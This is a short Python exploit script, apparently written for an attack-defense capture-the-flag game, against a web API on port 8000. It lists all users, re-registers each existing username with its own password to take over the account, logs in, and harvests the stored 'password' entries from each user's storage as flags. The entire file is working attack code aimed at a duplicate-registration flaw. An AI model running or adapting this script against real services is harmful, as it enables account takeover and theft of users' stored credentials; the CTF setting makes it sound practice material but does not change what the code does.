import requests
import json
import sys

PORT = 8000
PASSWORD = 'fgdhgshfjgghsfhj'


def get_users(r):
    users = []
    for i in range(len(json.loads(r))):
        users.append(json.loads(r)[i]["username"])
    return users


def register(url, username):
    creds = {"username": username, "password": PASSWORD}
    r = requests.post(f'{url}/register', json=creds)


def login(url, username):
    creds = {"username": username, "password": PASSWORD}
    r = requests.post(f'{url}/login', json=creds)
    token = json.loads(r.text)["token"]
    return token


def main():
    """
    Регистрация под существующем пользователем
    """
    args = sys.argv[1:]
    url = f'http://{args[0]}:{PORT}/api'
    r = requests.get(f'{url}/get_users')
    flags = []
    if r.status_code == 200:
        users = get_users(r.text)
        for i in users:
            register(url, i)
            auth_header = {'Authorization': f'Bearer {login(url, i)}'}
            r = requests.get(f'{url}/storage', headers=auth_header)
            flags.append(json.loads(r.text)[0]["password"])
        return flags


if __name__ == "__main__":
    print(main())
